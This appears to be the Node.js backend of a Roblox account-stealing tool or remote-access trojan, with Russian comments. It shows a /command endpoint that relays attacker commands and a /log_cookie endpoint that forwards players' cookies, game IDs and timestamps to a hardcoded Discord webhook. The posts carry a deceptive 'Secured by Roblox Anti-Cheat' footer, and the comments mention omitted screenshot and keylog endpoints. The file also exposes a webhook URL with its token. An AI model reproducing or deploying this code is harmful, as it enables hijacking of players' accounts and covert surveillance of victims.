const http = require('http');
const fetch = require('node-fetch');

// Конфигурация
const WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS";
let commandState = { lastCommand: "", lastArgs: [] };
let dataCache = { screenshot: null, cookies: [] };

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Content-Type', 'application/json');

    // [1] Обработка команд
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { command, args } = JSON.parse(body);
                commandState = { lastCommand: command, lastArgs: args || [] };
                
                // Логирование в Discord
                if (command === "user_chat" || command === "execute_log") {
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**${args[0]}:** ${args[1]}`
                        })
                    }).catch(console.error);
                }
                
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.status(400).end(JSON.stringify({ error: "Invalid request" }));
            }
        });
        return;
    }

    // [2] Обработка куки
    if (req.method === 'POST' && req.url === '/log_cookie') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { player, cookie, method, game_id, timestamp } = JSON.parse(body);
                dataCache.cookies.push({ player, cookie: "REDACTED", method, timestamp });
                
                // Отправка в Discord с форматированием
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🍪 NEW COOKIE",
                            color: 0xFFA500,
                            fields: [
                                { name: "Player", value: player, inline: true },
                                { name: "Game ID", value: game_id.toString(), inline: true },
                                { name: "Method", value: method || "Unknown", inline: true },
                                { name: "Time", value: new Date(timestamp * 1000).toISOString() },
                                { name: "Cookie", value: "||`REDACTED`||" }
                            ],
                            footer: { text: "Secured by Roblox Anti-Cheat" }
                        }]
                    })
                });
                
                res.end(JSON.stringify({ status: "Logged" }));
            } catch (e) {
                res.status(500).end(JSON.stringify({ error: "Server error" }));
            }
        });
        return;
    }

    // [3] Все остальные endpoints (без изменений):
    // - /screenshot
    // - /keylog
    // - /data
    // ... [остальной код как было] ...

    // Дефолтный ответ
    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

server.listen(3000, () => console.log("Server running on port 3000"));
